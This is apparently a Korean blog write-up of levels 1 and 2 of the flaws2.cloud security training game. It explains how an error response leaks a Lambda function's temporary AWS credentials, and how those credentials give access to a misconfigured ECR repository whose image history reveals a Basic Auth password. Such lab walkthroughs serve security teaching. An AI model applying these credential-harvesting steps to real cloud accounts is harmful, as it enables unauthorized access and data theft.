flaws2.cloud는 공격자, 방어자로 나눠져있다.

공격 먼저 해본다

## Level 1

### 요약
**API Gateway + Lambda 구조에서 발생하는 취약점을 이용하는 문제**
> 잘못된 입력 → Lambda 에러 발생 → 환경변수 노출 → AWS 임시 자격증명 획득 → S3 접근

### 1. 웹 구조 확인
- 페이지 HTML에서 form action이 AWS API Gateway를 향하는 것을 확인했다
- validateForm()이 입력값이 숫자인지 클라이언트 측에서 확인한다
- Burp로 패킷잡고 파라미터를 변조해서 우회해봤다.

```html
<form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
```

![Desktop View](..\assets\img\flaws2.cloud\level1-1.png)

### 2. 잘못된 입력으로 Lambda 에러

- 입력값을 조작해서 Lambda가 기대하지 않은 형식의 요청을 보내자 다음과 같은 에러가 반환됐다

![Desktop View](..\assets\img\flaws2.cloud\level1-2.png)

- 에러 메시지 뒤에 Lambda 실행 환경의 환경변수들이 JSON 형태로 노출됐다.

#### 왜 노출됐나?

>Lambda는 EC2와 달리 IAM Role 자격증명을 환경변수에서 사용합니다.

- EC2: Instance Metadata Service 169.254.169.254
- Lambda: **환경변수**

- 따라서 **Lambda 환경변수가 외부 응답에 노출되면 IAM 자격증명도 함께 노출**될 수 있다.
  - 개발자가 디버깅을 위해 에러 발생 시 환경변수를 그대로 출력하고, 수정하지 않을 때 발생할 수 있는 문제 같다

### 3. Lambda 환경변수에서 AWS 자격증명 발견

- 노출된 환경변수 중 중요한 값은
  - `AWS_ACCESS_KEY_ID`
  - `AWS_SECRET_ACCESS_KEY`
  - `AWS_SESSION_TOKEN`

- 이 값들은 Lambda가 실행될 때 사용하는 IAM Role의 임시 자격증명이다.

- 즉, **Lambda 함수가 가진 AWS 권한을 사용할 수 있게 된다**

### 4. AWS CLI 프로필 설정
- 노출된 3개 값을 이용해 AWS CLI에 level1 프로필을 설정하고, 어떤 Role인지 확인했다.

![Desktop View](..\assets\img\flaws2.cloud\level1-3.png)

```
> aws sts get-caller-identity --profile level1

현재 권한: level1 Role을 assume한 상태
```

### Level 1 공격 흐름
1. 웹 페이지 form action이 API Gateway를 향하는 것 확인
2. validateForm()이 클라이언트 측 검증임을 확인
3. 잘못된 입력으로 Lambda 에러 유도
4. 에러 응답에서 Lambda 환경변수 노출 확인
5. 환경변수에서 AWS 임시 자격증명 획득
6. AWS CLI에 level1 프로필 설정

8. S3 버킷 level1.flaws2.cloud 목록 조회
9. secret HTML 파일 발견

## Level 2
### 요약
**ECR 권한 설정 오류와 컨테이너 이미지 내부 정보 노출을 이용하는 문제**

- 문제에서 주어진 정보
  - Target: http://container.target.flaws2.cloud/
  - ECR repository name: level2

- **ECR**은 AWS에서 제공하는 Docker 이미지 저장소다.
- 앞에서 얻은 level1 프로필을 사용한다.

```
> aws sts get-caller-identity --profile level1

{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

- ECR 주소에는 이 `Account ID`가 사용된다.

### 1. ECR repository 조회

- 처음에는 ECR repository 전체 목록을 조회하려고 했지만 권한이 없다고 나온다.

`aws ecr describe-repositories --profile level1`

- ECR 레포지토리 이름이 level2라고 주어졌으므로 특정해서 조회했지만 역시 `AccessDenied`였다.

`aws ecr describe-images --profile level1 --repository-name level2`

- 힌트를 보고 이미지 목록을 조회했다.

```
aws ecr list-images --profile level1 --repository-name level2 --registry-id 653711331788

{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```

- ECR 이미지 주소는 `<account-id>.dkr.ecr.<region>.amazonaws.com/<repository>:<tag>`

즉, `653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest` 이다.

### 2. ECR 로그인
- 문제 힌트에서는 `aws ecr get-login` 라고 나와있지만

- 하지만 현재 **AWS CLI v2**에서는 이 명령이 제거되어 에러가 발생했다.

- 대신 AWS CLI v2에서는 **get-login-password** 명령을 사용한다고 한다.

`aws ecr get-login-password --region us-east-1 --profile level1`

- 이 명령은 ECR 로그인에 사용할 임시 비밀번호를 출력한다.
  - 이게 오류 없이 출력된다면 ECR에 Docker 클라이언트가 로그인할 수 있도록 인증 토큰을 발급받는 권한이 있다는 것이다 `ecr:GetAuthorizationToken`

- 이제, Docker가 ECR에 접근할 수 있게 인증정보를 저장한다.

`aws ecr get-login-password --region us-east-1 --profile level1 | docker login --username AWS --password-stdin 653711331788.dkr.ecr.us-east-1.amazonaws.com`


### 3. Docker 이미지 다운로드 후 히스토리 확인
- 다운로드

- `docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest`

  - `docker pull`이 오류 없이 된다면 **권한 설정이 잘못된 것**이다. level2의 root cause다.

- 다운로드한 이미지 inspect

```
docker inspect 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest

...
> docker inspect 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
[
    {
        "Id": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
        "RepoTags": [
            "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest"
        ],
        "RepoDigests": [
            "653711331788.dkr.ecr.us-east-1.amazonaws.com/level2@sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e"
        ],
        "Parent": "",
...
       
        "Config": {
            "ArgsEscaped": true,
            "Cmd": [
                "sh",
                "/var/www/html/start.sh"
            ],
...
```

- 사이트의 힌트에 따르면 Parent 필드에 있는 해시값을 다시 docker inspect에 넣으면 이전 단계 이미지의 설정/명령을 볼 수 있다고 하는데, parent 필드값이 비어있다. (이미지가 바뀐건지는 모르겠다)
- 그래서 **docker history** 명령어를 사용했다.

```
> docker history --no-trunc 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest

IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT
...
<missing>      7 years ago   /bin/sh -c htpasswd -b -c /etc/nginx/.htpass…   20.5kB 
...
```

- **htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password** 라는 명령어를 확인할 수 있다.
  - **htpasswd**는 Apache/Nginx Basic Auth용 비밀번호 파일 생성 도구다
    - Username: flaws2
    - Password: secret_password


### 4. 웹사이트 로그인
- 주어진 `http://container.target.flaws2.cloud/`에 위 정보로 로그인하면 level3로 넘어가게된다.

### Level 2 공격 흐름
1. 문제에서 ECR repository 이름 level2 확인
2. Level 1에서 얻은 AWS 자격증명 사용
3. sts get-caller-identity로 Account ID 확인
4. ECR 전체 조회 describe-repositories는 실패
5. level2 repository에 대해 list-images 실행
6. latest 태그와 image digest 확인
7. ECR 이미지 주소 구성
8. get-login-password로 ECR 인증 토큰 획득
9. Docker에 ECR 레지스트리 로그인
10. docker pull로 이미지 다운로드
11. docker inspect로 웹 서버 이미지임을 확인
12. docker history --no-trunc로 빌드 명령 확인
13. htpasswd 명령에서 Basic Auth 계정 발견
